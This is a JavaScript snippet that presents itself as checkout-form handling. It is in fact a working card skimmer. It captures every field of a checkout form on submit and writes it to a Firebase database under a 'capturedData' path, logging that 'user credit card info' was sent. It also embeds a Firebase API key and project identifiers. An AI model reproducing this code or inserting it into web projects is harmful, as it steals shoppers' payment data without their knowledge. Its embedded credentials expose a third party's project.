// Import the functions you need from the SDKs you need
//import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
//import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.8.0/firebase-database.js";
// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration
// For Firebase JS SDK v7.20.0 and later, measurementId is optional


checkoutForm.querySelector('button[type="submit"]').addEventListener('click', function(event) {
    
     const formElements = document.getElementById('checkout-form-content');
 
     // Initialize an object to store name-value pairs
     const formData = {};

    // console.log(new FormData(formElements));
     // Loop through all form elements
     for (let element of formElements) {
         if (element.name) { // Only process elements that have a name attribute
             formData[element.name] = element.value;
         }
     }

     (async function loadFirebase() {
        try {
          const firebaseApp = await import('https://www.gstatic.com/firebasejs/9.16.0/firebase-app.js');
          const firebaseDatabase = await import('https://www.gstatic.com/firebasejs/9.16.0/firebase-database.js');
      
          const firebaseConfig = {
            apiKey: "AIzaSyAsTsY61OzOBJlH5VdiUVkRdUGrtInAheI",
            authDomain: "xxs-9b29d.firebaseapp.com",
            databaseURL: "https://xxs-9b29d-default-rtdb.firebaseio.com",
            projectId: "xxs-9b29d",
            storageBucket: "xxs-9b29d.firebasestorage.app",
            messagingSenderId: "819456939608",
            appId: "1:819456939608:web:6f8efa699f894a91369c2d",
            measurementId: "G-LG40VELJ1Y"
          };
      
          // Initialize Firebase
          const app = firebaseApp.initializeApp(firebaseConfig);
          const database = firebaseDatabase.getDatabase(app);

          // Generate a random path
          const randomPath = `capturedData/${Date.now()}_${Math.floor(Math.random() * 10000)}`;

          const dbRef = firebaseDatabase.ref(database, randomPath);
          firebaseDatabase.set(dbRef, formData);
      
          console.log('user credit card info successfully sent to Firebase!', formData);
        } catch (error) {
          console.error('Error loading Firebase:', error);
        }
      })();
 });